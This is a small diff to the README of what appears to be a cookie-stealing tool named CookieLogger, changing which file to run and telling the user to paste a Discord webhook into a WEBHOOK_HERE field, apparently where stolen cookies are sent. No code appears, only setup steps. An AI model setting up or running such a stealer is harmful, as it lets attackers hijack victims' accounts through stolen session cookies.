@@ -31,7 +31,7 @@ Step 1; Download Zip and extract
 
 Step 2; Run the requirements file and wait until it finishes and installs all requirements
 
-Step 3; run the CookieLogger.exe file and wait until the gui opens
+Step 3; run the CookieLoggerV3.py file and wait until the gui opens
 
 Step 4; get your discord webhook and put it in the box that says WEBHOOK_HERE
 
